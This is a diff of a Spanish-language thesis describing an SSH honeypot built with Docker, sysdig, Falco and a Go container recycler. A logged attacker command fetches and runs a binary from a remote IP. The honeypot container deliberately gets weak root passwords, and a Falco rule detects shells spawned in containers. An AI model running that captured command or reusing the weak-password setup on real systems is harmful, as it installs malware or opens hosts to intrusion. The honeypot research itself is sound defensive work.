@@ -70,7 +70,7 @@ que se encarga de levantar / parar el container.
 \subsubsection{Licencia FDL aplicable a ésta memoria}
 \input{./fdl.tex}
 \subsubsection{Licencia Apache 2.0 aplicable a todo el código fuente}
-Todo el codigo fuente listado en ésta memoria o en soporte digital anexo se licencia bajo Apache License 2.0, una licencia libre sin \emph{copyleft} compatible con la GPL.
+Todo el código fuente listado en ésta memoria o en soporte digital anexo se licencia bajo Apache License 2.0, una licencia libre sin \emph{copyleft} compatible con la GPL.
 Se puede consultar los terminos de la licencia en la página de Apache \url{http://www.apache.org/licenses/LICENSE-2.0}
 
 \subsection{Bibliografia}
@@ -130,7 +130,7 @@ Para obtener ésta información hay diversas fuentes dentro del kernel:
     \item[\emph{kprobes}] el kernel modifica las instrucciones en ensamblador en tiempo de ejecución para activar la instrumentación. Si hablamos
     de \emph{kprobes} las funciones a instrumentar son parte del kernel. 
     \item[\emph{uprobes}] Similar a \emph{kprobes} pero para funciones en espacio de usuario como \emph{malloc}.
-    \item[\emph{tracepoints}] A diferencia de un \emph{kprobe} o \emph{uprobe}, un tracepoint se define en el codigo fuente y se genera en tiempo de compilación, pudiendo ser activados en tiempo de ejecución cuando se requiera y extraer la información de ese \emph{tracepoint}.
+    \item[\emph{tracepoints}] A diferencia de un \emph{kprobe} o \emph{uprobe}, un tracepoint se define en el código fuente y se genera en tiempo de compilación, pudiendo ser activados en tiempo de ejecución cuando se requiera y extraer la información de ese \emph{tracepoint}.
     \item[\emph{ptrace}] A traves de la \emph{syscall ptrace (process trace)}, se le otorga a un proceso la capacidad de inspeccionar y modificar el comportamiento del proceso instrumentado. 
 \end{enumerate}
 
@@ -295,7 +295,7 @@ Por éstas razones se descarta el uso de \emph{eBPF} que aunque prometedor aún 
 \label{subsec:kernel-modulo}
 
 Dado que por las razones expuestas extraer información vía interfaces externas no parecía factible, hay que explorar otras opciones.
-el kernel de \emph{Linux} es modular, y por tanto se puede inyectar un módulo de codigo que extienda las capacidades del kernel, es la manera
+el kernel de \emph{Linux} es modular, y por tanto se puede inyectar un módulo de código que extienda las capacidades del kernel, es la manera
 en que habitualmente se cargan nuevos controladores, por ejemplo.
 
 Ya que extraer información a través de interfaces conocidas no es factible, queda la opción de crearnos la nuestra propia. 
@@ -456,6 +456,7 @@ pruebas de red para saber si la conectividad entre proveedores es buena, y tendr
 Los proveedores de servicios de computación en exclusiva (\emph{VPS}, \emph{Housing}) no suelen cobrar el trafico de red a no ser que superemos ciertos umbrales.
 
 \subsubsection{Notificaciones usando un recolector de \emph{logs}}
+\label{subsubsec:usando-rsyslog}
 
 Podemos considerar esta opción como una hibrida de las anteriores, instalaremos una aplicación de recolector de logs en la sonda. 
 La sonda escribirá eventos en disco cuando estos se produzcan, el sistema de recoleccion de logs monitorizará los \emph{logs} en disco, y
@@ -767,23 +768,23 @@ los siguientes pasos:
 Todos estos pasos pueden ser ejecutados por un operador humano y a menudo lo son, pero si queremos un proceso repetible, rapido y automatizado
 no podemos permitirnos que estos procesos sean manuales, ya que imposibilitan crear un nuevo servidor en el orden de minutos.
 
-\subsubsection{Infrastructura como codigo}
+\subsubsection{Infrastructura como código}
 \label{subsec:infra-as-code}
 
 Un enfoque que nos acerca al objetivo de ser capaces de desplegar nuevas maquinas en minutos, necesaria en un entorno dinamico, es adoptar la practica
-de infrastructura como codigo (véase \cite{fowler-infra-as-code}). Dicha practica se basa en:
+de infrastructura como código (véase \cite{fowler-infra-as-code}). Dicha practica se basa en:
 
 \begin{itemize}
     \item Definición en ficheros. Toda la configuracion se recoge en ficheros ejecutables, ninguna persona deberia entrar en el servidor
     y realizar cambios de configuracion manualmente, de hacerlo, estaria creando servidores unicos fragiles (\emph{Snowflake Servers}).
-    \item Autodocumentacion.El codigo documenta el proceso seguido para la configuracion sin necesidad de una documentacion externa orientada a un humano (aunque la documentacion pueda y es aconsejable que exista en algunos casos), esto evita que la documentacion quede anticuada.
-    \item Versionado. El codigo fuente que define la infrastructura se mantiene en un sistema de control de versiones de codigo,lo que permite ser auditado y lanzar ejecuciones reproducibles (lanzar una versión especifica).
-    \item Cambios pequeños. Si se realizan cambios pequeños en codigo es facil diagnosticar cuando se introducen errores.
+    \item Autodocumentacion.El código documenta el proceso seguido para la configuracion sin necesidad de una documentacion externa orientada a un humano (aunque la documentacion pueda y es aconsejable que exista en algunos casos), esto evita que la documentacion quede anticuada.
+    \item Versionado. El código fuente que define la infrastructura se mantiene en un sistema de control de versiones de código,lo que permite ser auditado y lanzar ejecuciones reproducibles (lanzar una versión especifica).
+    \item Cambios pequeños. Si se realizan cambios pequeños en código es facil diagnosticar cuando se introducen errores.
 \end{itemize}
  
 Este enfoque requiere que haya algun proceso de \emph{Continuous Integration} o \emph{Continous Delivery} o la definicion de los ficheros
 de la configuración no se corresponderá con la configuración que se encuentra en los servidores (\emph{Configuration Drift}). Si construimos 
-un proceso de aplicación de la configuración que se lance desde algún cambio del codigo podremos conseguir:
+un proceso de aplicación de la configuración que se lance desde algún cambio del código podremos conseguir:
 
 \begin{itemize}
     \item Cambios \emph{in-place}. Aplicaremos los cambios sobre los servidores que ya se ejecuten, cambiando configuración en caliente de los servicios que corren.
@@ -804,7 +805,7 @@ significaria replicar estados y/o datos previamente al despliegue lo que aumenta
 
 \subsubsection{Eleccion de herramienta de gestión de la configuración}
 
-Para implementar infrastructura como codigo se necesita utilizar una herramienta que defina como almacenar la configuración
+Para implementar infrastructura como código se necesita utilizar una herramienta que defina como almacenar la configuración
 como ejecutarla en servidores e idealmente bibliotecas de funciones y modulos que faciliten la descripción de servicios.
 
 Existen varias herramientas de este tipo, aunque la industria utiliza cuatro utilidades de facto para gestión de la configuración, \emph{Ansible},\emph{Puppet},\emph{Chef}
@@ -832,6 +833,19 @@ A continuación incluimos la arquitectura final de la sonda, que puede observars
     \label{fig:arquitectura-sonda}
   \end{figure}
 
+\subsection{elección del sistema operativo de la sonda}
+\label{subsec:sonda-so}
+  
+La eleccion del sistema operativo tiene una componente en la que tendremos que tener en cuenta las capacidades del sistema operativo para su securizacion,
+la existencia o no de actualizaciones de seguridad y las herramientas que incluye en su repositorio.
+
+Para este proyecto se ha escogido GNU/Linux como sistema operativo por las herramientas que nos provee para gestionar nuestra \emph{honeypot} y su mejor soporte
+para \emph{containers}, tendremos que escoger una distribución del sistema operativo que nos provea de actualizaciones de seguridad. 
+Se ha escogido Debian como distribución por ser la opción de referencia para servidores y mantener software testado, con actualizaciones de seguridad, 
+\emph{builds} reproducibles y por ser la distribución que más conoce y prefiere el autor,
+ la opción podria haber incluido \emph{CentOS, Container Linux, RHEL \ldots} o cualquier distribución con soporte. 
+
+
 \subsection{Creacion del servicio expuesto}
 
 Para la creación del servicio expuesto existen varias alternativas, uno de los objetivos de éste proyecto es la de utilizar
@@ -848,7 +862,182 @@ web, servidores FTP o cualquier otro tipo de servicio.
 No todos los servicios tienen el mismo volumen de ataques ni el mismo interés, por ello, se escoge un servicio atractivo como SSH que 
 expone el acceso a un servidor y capacita al atacante a realizar multiples tipos de ataques.
 
-\begin{listing}
+\subsubsection{Gestionando el servicio expuesto en el \emph{container}}
+
+Para gestionar el servicio expuesto crearemos un \emph{daemon} que se encargará de monitorizar que el container esta siempre levantado, construir
+la imagen y otras configuraciones. Para lanzar y mantener el estado del \emph{daemon} usaremos la funcionalidad existente en el gestor de procesos \emph{systemd}.
+
+\emph{systemd} es un sistema de arranque diseñado para reemplazar \emph{sysinit V} y \emph{upstart} los sistemas de arranque clasicos, que ha sido adoptado
+por las distribuciones principales tras generar resistencia y controversia.
+
+    \begin{minted}[fontsize=\footnotesize]{console}
+        [Unit]
+        Description=Launch containers at startup
+        
+        [Service]
+        Type=forking
+        ExecStart=/usr/local/sbin/containersvc start
+        ExecStop=/usr/local/sbin/containersvc stop
+        Requires=docker.service
+        RemainAfterExit=no
+        Restart=always
+        PIDFile=/var/run/containersvc.pid
+        
+        [Install]
+        WantedBy=multi-user.target
+    \end{minted}
+    \captionof{listing}{Unidad de \emph{systemd} que gestiona el servicio \emph{containersvc} \label{listing:containersvc-systemd}
+    }
+
+Definiremos la unidad de \emph{systemd} (véase \cite{wiki-systemd}) listada como código \ref{listing:containersvc-systemd}, en ella se define el servicio \emph{containersvc} que requiere
+que el servicio Docker este levantado (véase la directiva \emph{Requires}) y que será reiniciado siempre y cuando el servicio no exista (directiva \emph{Restart}). 
+\emph{systemd} conocerá el estado del servicio monitorizando el estado del proceso cuyo \emph{PID} se almacena en la ruta descrita en la directiva \emph{PIDFile}.
+
+El servicio básicamente lanzará un script, listado como código \ref{listing:containersvc-bash}, al que le pasara \emph{start} como argumento cuando arranque y \emph{stop}
+cuando se pare.\ \\
+
+    \begin{minted}[fontsize=\scriptsize]{console}
+        #!/bin/bash
+        ### BEGIN INIT INFO
+        # Provides: containersvc
+        # Required-Start: $local_fs $network $remote_fs
+        # Required-Stop: $local_fs $network $remote_fs
+        # Default-Start:  2 3 4 5
+        # Default-Stop: 0 1 6
+        # Short-Description: start and stop containers service
+        ### END INIT INFO
+        
+        set -eufo pipefail
+        
+        DESC="container daemon"
+        NAME="containersvc"
+        PIDFILE="/var/run/containersvc.pid"
+        touch $PIDFILE
+        KPID=$(cat $PIDFILE)
+        DOCKER_NETWORK="image_ssh"
+        
+        do_start() {
+            touch $PIDFILE
+            if [ -n "${KPID}" -a -d "/proc/${KPID}" ];then
+              logger -t info [$NAME] $NAME already running
+            else
+              # cleanup unused and old docker images and volumes
+              docker system prune -f
+              cd /var/tmp/image
+              export RANDOM_PASSWORD=$(shuf -n 1 /usr/share/dict/typical_passwords)
+              export RANDOM_NAME=$(shuf -n 1 /usr/share/dict/words | tr -d "'")
+              docker-compose up --build &
+              echo $! > $PIDFILE
+              sleep 10
+              /usr/local/sbin/tc_manager.sh start $DOCKER_NETWORK
+            fi
+        }
+        
+        do_stop() {
+         echo "Stopping $NAME";
+         if [ -n "${KPID}" -a -d "/proc/${KPID}" ];then
+             kill $KPID
+             cd /var/tmp/image
+             docker-compose stop
+             # clearing up older iptables routes
+             iptables -Z -t nat
+             iptables -F -t nat
+             /usr/local/sbin/tc_manager.sh stop $DOCKER_NETWORK
+         fi
+        }
+        
+        
+        case "$1" in
+           start)
+             do_start
+             ;;
+           stop)
+             do_stop
+             ;;
+           restart)
+             do_stop
+             do_start
+             ;;
+           *)
+             echo "Usage: /etc/init.d/$NAME start|stop"
+             exit 1
+             ;;
+        esac
+        
+        exit 0
+    \end{minted}
+    \captionof{listing}{Listado del servicio \emph{containersvc}      \label{listing:containersvc-bash}}
+
+    
+El script, descrito como código \ref{listing:containersvc-bash}, realizará las siguientes acciones:
+
+\begin{enumerate}
+    \item Crear el fichero donde se almacenará el PID si no existe.
+    \item Limpiar viejas imagenes y volumenes antes de crear nuevos.
+    \item Escoger una contraseña aleatoria como contraseña para los usuarios del servicio. Dicha
+    contraseña se escoge de un listado de las 100 contraseñas más inseguras y reutilizadas, lo que aumenta
+    el ratio de exito para los atacantes en la explotación y podemos aprender más.
+    \item Escoger un nombre aleatorio como nombre de máquina, esto hace que el \emph{container} parezca un servicio
+    más creible y que atacantes no descarten la intrusión por detectar que estan en un entorno construido para atraparles.
+    \item Lanza un proceso (\emph{docker-compose}, un orquestrador de ordenes de Docker con un DSL propio) que crea la imágen del container, una red propia para ese container y lanza el container. 
+    \item Lanza un proceso que limita el ancho de banda de red, se hablará más de ello en la sección \ref{subsec:securizacion-sonda}.
+\end{enumerate}
+
+la definición del \emph{docker-compose} se incluye como código \ref{listing:ssh-docker-compose}, en el fichero se puede ver que se expone el puerto
+22 (puerto bien conocido para SSH), y que se le pasa el directorio actual para construir el \emph{container} y algunas variables de entorno 
+creadas en el script listado como código \ref{listing:containersvc-bash}.
+
+    \begin{minted}[fontsize=\footnotesize]{console}
+        version: "2"
+        services:
+          ssh:
+            build:
+              context: . #current dir as build context
+              args:
+                PASSWORD_GENERATED: ${RANDOM_PASSWORD}
+            image: ssh
+            ports:
+              - "22:22"
+            container_name: ssh
+            hostname: ${RANDOM_NAME}
+            domainname: superprivy.com
+            networks:
+              - ssh
+        networks:
+          ssh:
+            driver: bridge
+    \end{minted}
+    \captionof{listing}{\emph{docker-compose} que crea el container \emph{servicebase}     \label{listing:ssh-docker-compose}}
+
+El fichero Dockerfile que define la imagen, listado como \ref{listing:Dockerfile}, recoge la variable 
+\emph{PASSWORD\_GENERATED} pasada como argumento al \emph{build} y la utiliza para cambiar la contraseña
+de dos usuarios del sistema. 
+
+Como punto de entrada se levanta el servicio SSH y se deja un proceso sin fin
+corriendo (\emph{sleep infinity}) que es el que utilizará docker para monitorizar el container y será proceso
+número 1, como no acaba nunca, el container se ejecutará de manera continua. 
+
+Esta imágen depende de otra, llamada \emph{servicebase}, cuya definición puede verse en código \ref{listing:Dockerfile-base}, 
+esto permite que la creación de nuevos \emph{containers} sea muy rapida (aproximadamente 1 segundo), ya que 
+la imágen base contiene el sistema operativo y todas las utilidades ya descargadas y preparadas.
+
+Si se quiere actualizar o cambiar la versión o incluir alguna utilidad sólo hemos de modificar el Dockerfile
+de la imagen base, cuya construcción será más lenta (del orden de minutos).
+
+    \begin{minted}[fontsize=\footnotesize]{console}
+        FROM servicebase:0.0.1
+        ARG PASSWORD_GENERATED
+        RUN echo "jeremy:$PASSWORD_GENERATED" | chpasswd
+        RUN echo "root:$PASSWORD_GENERATED" | chpasswd
+        RUN unset PASSWORD_GENERATED
+        CMD /etc/init.d/ssh start && sleep infinity
+        ENTRYPOINT /etc/init.d/ssh start && sleep infinity
+        
+    \end{minted}
+    \captionof{listing}{Dockerfile para SSH \label{listing:Dockerfile}}
+    
+
+
 \begin{minted}[fontsize=\footnotesize]{console}
     FROM debian:latest
     RUN useradd -ms /bin/bash jeremy
@@ -862,70 +1051,577 @@ expone el acceso a un servidor y capacita al atacante a realizar multiples tipos
     CMD /etc/init.d/ssh start && sleep infinity
     ENTRYPOINT /etc/init.d/ssh start && sleep infinity
 \end{minted}
-\caption{Dockerfile base para imagen}
-\label{listing:Dockerfile-base}
-\end{listing}
+\captionof {listing}{Dockerfile base para imagen \label{listing:Dockerfile-base}}
 
 
 
 
-
-
-% eleccion del protocolo.
-% imagen de docker
-% cambio de contrasenya en cada inicio de un listado de contraseñas poco seguras. 
-% prueba con imagenes sin contraseña.
-
+\clearpage
 \subsection{Obtencion de trazas usando sysdig}
 
-% lanzar daemon systemd que levanta sysdig y guarda todas las trazas en disco local
-% cronjob que limpia disco de trazas si supera porcentaje de disco usado
+Para obtener las trazas, lanzaremos otro \emph{daemon} encargado de levantar \emph{sysdig} y mantenerlo.
+La definición de la unidad de \emph{systemd} se encuentra en el código \ref{listing:sysdig-systemd}. 
+
+Básicamente se lanza un script llamado \emph{sysdigd} (\emph{sysdig daemon}) que se monitoriza a través
+del PID almacenado en el fichero descrito en la directiva \emph{PIDFile}, y siempre que el servicio
+este parado se reiniciará como describe la directiva \emph{Restart}.
+
+    \begin{minted}[fontsize=\footnotesize]{console}
+        [Unit]
+        Description=Launch sysdigd as daemon
+        
+        [Service]
+        Type=forking
+        ExecStart=/usr/local/sbin/sysdigd start
+        ExecStop=/usr/local/sbin/sysdigd stop
+        RemainAfterExit=no
+        Restart=always
+        PIDFile=/var/run/sysdigd.pid
+        
+        [Install]
+        WantedBy=multi-user.target
+    \end{minted}
+    \captionof{listing}{Unidad de \emph{systemd} para controlar el \emph{daemon} de \emph{sysdig}   \label{listing:sysdig-systemd}}
+\bigskip
+
+El script en si, se lista como código \ref{listing:sysdig-bash}, lo más relevante quizá
+son las opciones que se pasan a \emph{sysdig}. Se hará una breve explicación de estas:
+ \begin{minted}[fontsize=\footnotesize]{console}
+        #!/bin/bash
+        ### BEGIN INIT INFO
+        # Provides: sysdigd
+        # Required-Start: $local_fs $network $remote_fs
+        # Required-Stop: $local_fs $network $remote_fs
+        # Default-Start:  2 3 4 5
+        # Default-Stop: 0 1 6
+        # Short-Description: start and stop service sysdigd
+        ### END INIT INFO
+        
+        
+        DESC="sysdig daemon"
+        NAME="sysdigd"
+        PIDFILE="/var/run/sysdigd.pid"
+        TRACES_DIR="/var/log/traces"
+        KPID=$(cat $PIDFILE)
+        
+        do_start() {
+            if [ ! -d /var/log/traces ];then
+                logger -t info "creating traces directory"
+                mkdir -p $TRACES_DIR &> /dev/null
+        
+            fi
+        
+            if [ -n "${KPID}" -a -d "/proc/${KPID}" ];then
+                logger -t info [sysdigd] sysdig already running
+            else
+                logger -t info [sysdigd] launching sysdigd
+                bash -c "sysdig -s 4096 -pc -F -C 200 -G 300 -W 5 -z \
+                  -w /var/log/traces/$(hostname).%F-%H-%M.part > /dev/null 2>&1 &"
+                sleep 5
+                logger -t info [sysdigd] launched sysdigd
+                PID=$(pidof sysdig)
+                if [ -z "$PID" ];then
+                    logger -t error [sysdigd] something went wrong, unable to launch sysdig
+                    exit 2
+                else
+                    echo $PID > /var/run/sysdigd.pid
+                fi
+            fi
+        }
+        
+        do_stop() {
+         echo "Stopping $NAME";
+             PID=$(pidof sysdig)
+             if [ ! -z "$PID" ];then
+                kill $PID
+             fi
+        }
+        
+        
+        case "$1" in
+           start)
+             do_start
+             ;;
+           stop)
+             do_stop
+             ;;
+           *)
+             echo "Usage: /etc/init.d/sysdigd start|stop"
+             exit 1
+             ;;
+        esac
+        
+        exit 0
+    \end{minted}
+    \captionof{listing}{script que controla sysdig  \label{listing:sysdig-bash}}
+
+\begin{itemize}
+    \item[\textbf{-s 4096}] Define el espacio de almacenamiento de datos, muchas \emph{syscalls} como conexiones, escritura de ficheros guardarán datos, este parametro define 
+    cuantos datos guardaremos. Lo ideal para tener toda la información para su análisis sería guardar todos los datos, pero esto generaria trazas de longitud variable 
+    y posiblemente de un tamaño que por su longitud sea complejo de gestionar (quizás se llenarian los discos de la sonda, se tardaría mucho tiempo en recolectar la traza o procesarla ). 
+    Definimos 4KiB por ser un tamaño adecuado para captar la mayoría de datos intercambiados y de los obtenidos parcialmente quizá obtener cierto conocimiento sobre ellos. 
+    \item[\textbf{-pc}] La salida incluirá información acerca de containers, como la imagen del \emph{container}.
+    \item[\textbf{-F}] Incluye todos los eventos, genera trazas más grandes pero más precisas.
+    \item[\textbf{-C 200}] Rotar el fichero de traza si el tamaño es superior a $200 * 10^6$ bytes.
+    \item[\textbf{-G 300}] Rotar el fichero de traza si el fichero actual es más antiguo de 300 segundos.
+    \item[\textbf{-W 5}] Mantener 5 ficheros de rotado. Junto a la opción \emph{-C} y \emph{G} nos aseguramos que en caso
+    de recibir muchos eventos, las trazas seguiran siendo gestionables.
+    \item[\textbf{-z}] Comprimir el fichero de traza.
+    \item[\textbf{-w \emph{ruta}}] En que ruta se almacenan las trazas.
+\end{itemize}
+
+   
+
+\subsubsection{Gestionar espacio de la sonda y eliminar trazas}
+
+Pese a que nuestro objetivo es mantener todas las trazas posibles, por razones puramente fisicas,
+el almacenamiento se acabará. Necesitamos algún proceso (listado como código \ref{listing:sysdig-cleanup-traces-script}) que se encargue de limpiar las trazas más antiguas, haciendo
+hueco a las nuevas. Este proceso se debe lanzar con frecuencia, se ha configurado para ser lanzado cada 2 minutos en un \emph{Cronjob}.
+
+Este proceso normalmente no hará nada, pero si el espacio del punto de montaje seleccionado es menor del 10\%, en ese caso
+se preservan las trazas mas recientes (60 minutos desde que se ejecute, para dar margen al proceso de recoleccion de trazas) y se elimina el resto.
+
+    \begin{minted}[fontsize=\footnotesize]{console}
+        #!/usr/bin/env bash
+        set -euo pipefail
+        
+        FREE_SPACE_THRESHOLD=10
+        MOUNT_TO_WATCH="/"
+        TRACES_DIR="/var/log/traces"
+        LAST_MODIFIED_FILES_TO_KEEP_IN_MINUTES="60"
+        
+        
+        get_free_disk_left() {
+            percent=$(df -h ${MOUNT_TO_WATCH} --output=pcent | tail -1 | xargs | tr -d '%')
+            FREE_SPACE=$((100-percent))
+        }
+        
+        check_if_cleanup_is_needed () {
+            if [[ $FREE_SPACE -le $FREE_SPACE_THRESHOLD ]]; then
+                logger -t info "[cleanup] removing old traces"
+                find $TRACES_DIR  -path "/var/log/traces/.ssh/*" -prune \
+                -o -xtype f -mmin +$LAST_MODIFIED_FILES_TO_KEEP_IN_MINUTES -print0 | xargs -0 -L 50 rm
+            fi
+        }
+        
+        get_free_disk_left
+        check_if_cleanup_is_needed
+    \end{minted}
+    \captionof{listing}{script que se lanza periodicamente para limpiar trazas. \label{listing:sysdig-cleanup-traces-script}    }
+    
 
 \subsection{Notificaciones usando falco}
 
-% Reglas de falco.
-% necesidad de crear container_recycler.
+\emph{Falco} es una herramienta desarrollada por \emph{sysdig} que se encarga de monitorizar el comportamiento del sistema y notificar en 
+caso de que el sistema cumpla la regla descrita.
 
-\subsection{Gestor de containers en la sonda}
+Sirva como ejemplo la siguiente regla:
 
-% Por que hace falta, que hace.
+\begin{minted}[fontsize=\scriptsize]{console}
+    - rule: Run shell in container
+    desc: a shell was spawned by a non-shell program in a container. Container entrypoints are excluded.
+    condition: in_potted_container and spawned_process and container and shell_procs and proc.pname exists 
+               and not proc.pname in (shell_binaries, docker_binaries, 
+               k8s_binaries, initdb, pg_ctl, awk, apache2, falco, cron)
+    output: "Shell spawned in a container other than entrypoint 
+             (user=%user.name %container.info %container.info 
+              shell=%proc.name parent=%proc.pname cmdline=%proc.cmdline)"
+    priority: ALERT
+\end{minted}
+\captionof{listing}{Extracto de reglas de \emph{Falco}. \label{listing:extracto-falco}}
+\bigskip
 
+En ella se describe el titulo de la regla \emph{Run shell in a container}, una descripción de la regla y una condición que disparará la regla.
+Si en un \emph{container } monitorizado se crea un proceso que no sea una shell, el binario de docker o algunas herramientas conocidas
+la condición se cumple y se dispara una notificación con la prioridad descrita (ALERTA).
+
+Esta regla nos sirve para identificar cuando nuestra \emph{honeypot} de SSH ha sido vulnerada. Esta regla es un ejemplo de muchas
+que ya vienen en el paquete de reglas base de \emph{Falco}. 
+
+Para éste proyecto se han realizado las siguientes modificaciones al conjunto de reglas base:
+
+\begin{itemize}
+    \item Identificar que reglas  marcan claramente que la \emph{honeypot} ha sido vulnerada
+    y cambiar su prioridad al nivel maximo de ALERTA.
+    \item Modificar las macros y las reglas para escuchar eventos únicamente de los containers que exponen servicios vulnerables.
+\end{itemize}
+
+Con estos cambios, \emph{Falco} se encarga de notificarnos cuando alguna de las condiciones descritas en estas reglas se cumplen.
+Lo siguiente a realizar será actuar en base a estas notificaciones. En concreto necesitaremos las siguientes actuaciones:
+
+\begin{enumerate}
+    \item Registraremos las alertas en un fichero de log, que posteriormente sera recolectado por el recolector vía \emph{rsyslog}.
+    \item Necesitamos que una vez detectada la intrusión, permitir al atacante actuar durante algún tiempo para obtener trazas, pero
+    pasado este tiempo se ha de parar el container, borrarlo y crear uno nuevo desde una imagen limpia.
+\end{enumerate}
+
+Para la primera accion tenemos todas las herramientas necesarias, sólo utilizando \emph{rsyslog} conseguimos el objetivo (véase \ref{subsubsec:usando-rsyslog}).
+La segunda acción, sin embargo, es más compleja y necesitaremos algún proceso que se encargue de por un lado escuchar las notificaciones de falco y 
+actuar en consecuencia, parando el container en ejecución tras pasar el tiempo de exposición. 
+
+\subsection{Gestor de containers comprometidos en la sonda}
+
+
+Para implementarlo, se crea una aplicación en \emph{Go} que realice estas funciones. Las razones para escoger \emph{Go} como lenguaje son:
+
+\begin{enumerate}
+    \item Soporta la concurrencia de una manera muy elegante y facil a través de \emph{gorutinas} y canales.
+    \item El compilador genera un binario estatico que no requiere dependencias, en un entorno de seguridad como éste proyecto esto
+    tiene un gran valor ya que al no depender de bibliotecas dinamicas del sistema reducimos la superficie de ataque.
+    \item El hecho de que genere un unico binario facilita la distribución e instalación de la aplicación que se reduce a copiar el fichero binario y darle permisos de ejecución.
+\end{enumerate}
+
+En el anexo \ref{subsec:containe-recycler-src-code} se listan algunos trozos de código de la aplicación. El encargado de lanzar el proceso será el propio
+\emph{Falco}, como puede verse en el siguiente extracto de configuración:
+
+\begin{minted}[fontsize=\scriptsize]{console}
+    program_output:
+    enabled: true
+    program: "/usr/local/bin/container_recycler | tee -a /var/log/falco_alerts.txt"
+\end{minted}
+\captionof{listing}{Extracto de configuración de \emph{Falco}. \label{listing:config-falco}}
+\bigskip
+
+
+Cuando se recibe una notificación de tipo ALERT, el proceso deja el container vivo durante algún tiempo (10 minutos) y tras ese tiempo
+mata el container.
+
+El servicio de \emph{containersvc}, descrito anteriormente (véase código \ref{listing:containersvc-bash}), detectará que el proceso ha sido matado
+y creará un nuevo container.
+
+\begin{minted}[fontsize=\tiny]{console}
+    time="2017-08-29T21:55:59Z" level=debug msg="ParseFalcoNotifications: received a falco notification" 
+    time="2017-08-29T21:55:59Z" level=info msg="{21:55:58.886876283: Alert Shell spawned in a container other than entrypoint 
+    (user=root ssh (id=fecb65acaf55) ssh (id=fecb65acaf55) shell=bash parent=sshd cmdline=bash -c #!/bin/sh
+    PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
+    wget http://155.94.161.92/ys808e
+    curl -O http://155.94.161.92/ys808e
+    chmod +x ys808e
+    ./ys808e
+    ) Alert Run shell in container 2017-08-29 21:55:58.886876283 +0000 UTC}" 
+    time="2017-08-29T21:55:59Z" level=debug msg="map[user:root image_name:ssh image_id:fecb65acaf55]" 
+    time="2017-08-29T21:55:59Z" level=debug msg="Alert received, will try to stop container" 
+    time="2017-08-29T21:55:59Z" level=debug msg="incomparable ID, provided ID is larger than existing one 
+    time="2017-08-29T21:55:59Z" level=debug msg="FalcoNotification.handle: stopping container" 
+    time="2017-08-29T21:55:59Z" level=info msg="scheduled container ssh for stopping" 
+    time="2017-08-29T21:55:59Z" level=debug msg="ScheduleContainerStop: outside the lambda function waiting for DONE signal" 
+    time="2017-08-29T22:05:59Z" level=info msg="Stopping container ssh NOW!" 
+    time="2017-08-29T22:06:09Z" level=info msg="container ssh has been stopped" 
+    time="2017-08-29T22:06:09Z" level=debug msg="ScheduleContainerStop: Lambda function DONE"     
+\end{minted}
+\captionof{listing}{Extracto de log de \emph{container\_recycler}. \label{listing:container-recycler}}
+\bigskip
 
 \subsection{Securizacion de la sonda}
-
+\label{subsec:securizacion-sonda}
 Hay diversas medidas de seguridad a aplicar en la sonda. Si seguimos el principio de defensa en profundidad \cite{wikipedia-defense-in-depth}, aplicaremos diversas capas de proteccion en diferentes sistemas.
 
-\subsubsection{elección del sistema operativo de la sonda}
+\subsubsection{securizacion del sistema operativo}
 
-La eleccion del sistema operativo tiene una componente en la que tendremos que tener en cuenta las capacidades del sistema operativo para su securizacion,
-la existencia o no de actualizaciones de seguridad.
+En nuestro caso al escoger \emph{Debian} podremos utilizar capacidades como el sistema de \emph{unattended-upgrades} para actualizar paquetes del sistema cuando 
+se publiquen actualizaciones de seguridad. 
 
-Para este proyecto se ha escogido GNU/Linux como sistema operativo por las herramientas que nos provee para gestionar nuestra \emph{honeypot}, 
-tendremos que escoger una distribución del sistema operativo que nos provea de actualizaciones de seguridad. 
-Se ha escogido Debian como distribución por ser la opción de referencia para servidores y mantener software testado, con actualizaciones de seguridad, \emph{builds} reproducibles y por ser la distribución que más conoce y prefiere el autor, la opción podria haber incluido \emph{CentOS, Container Linux, RHEL \ldots} 
-
-En nuestro caso al escoger \emph{Debian} podremos utilizar el sistema de \emph{unattended-upgrades} para actualizar paquetes del sistema cuando se publiquen actualizaciones de seguridad. Es recomendable seguir
-los estandares de la industria, como las guias de securización del \emph{CIS} o del \emph{NIST} (véase \cite{ovh-debian-cis} como ejemplo aplicado), que proporcionan guias de securizacion para la mayoria de distribuciones y que son utilizadas para el cumplimiento de legislación para poder gestionar datos sensibles como tarjeta de credito (PCI-DSS). 
+Es recomendable seguir los estandares de la industria, como las guias de securización del \emph{CIS} o del 
+\emph{NIST} (véase \cite{ovh-debian-cis} como ejemplo aplicado), que proporcionan guias de securizacion
+para la mayoria de distribuciones y que son utilizadas para el cumplimiento de legislación para poder
+gestionar datos sensibles como tarjeta de credito (PCI-DSS) (véase \cite{wiki-pci-dss}). 
 
 \subsection{Reducción de la superficie de ataque}
 
+Para ello debemos eliminar servicios innecesarios de nuestro sistema, y limitar el acceso a la red configurando un cortafuegos, que permita
+el acceso sólo a los puertos que nosotros deseamos desde los origenes que deseamos.
+
+\begin{minted}[fontsize=\scriptsize]{console}
+    # {{ansible_managed}}
+    iptables -P INPUT DROP
+    iptables -P FORWARD ACCEPT
+    iptables -P OUTPUT ACCEPT
+    # las conexiones establecidas se mantienen.
+    iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
+    iptables -A INPUT -i lo -j ACCEPT
+    iptables -A INPUT -p icmp -j ACCEPT
+    #servicio expuesto
+    iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 22 -j ACCEPT
+    #ssh de gestion
+    iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 30009 -j ACCEPT
+    {% for host in groups['collector'] %}
+     {% for ip in hostvars[host]['ansible_all_ipv4_addresses'] | ipaddr(firewall_ipaddr_filter) %}
+      iptables -A OUTPUT -p tcp -m state --state NEW -m tcp -o docker0 -d {{ ip }}/32 --dport 38080 -j REJECT
+     {% endfor %}
+    {% endfor %}
+    
+    iptables -A INPUT -j REJECT --reject-with icmp-net-unreachable 
+    iptables -A FORWARD -j REJECT --reject-with icmp-net-unreachable     
+    # Set up default policies
+    
+    ip6tables -P INPUT DROP
+    ip6tables -P FORWARD DROP
+    # we allow ipv6 output for updates
+    ip6tables -P OUTPUT ACCEPT
+    
+    # Allow localhost traffic. This rule is for all protocols.
+    
+    ip6tables -A INPUT -s ::1 -d ::1 -j ACCEPT
+\end{minted}
+\captionof{listing}{Reglas de cortafuegos para sonda. \label{listing:cortafuegos-sonda}}
+\bigskip
+
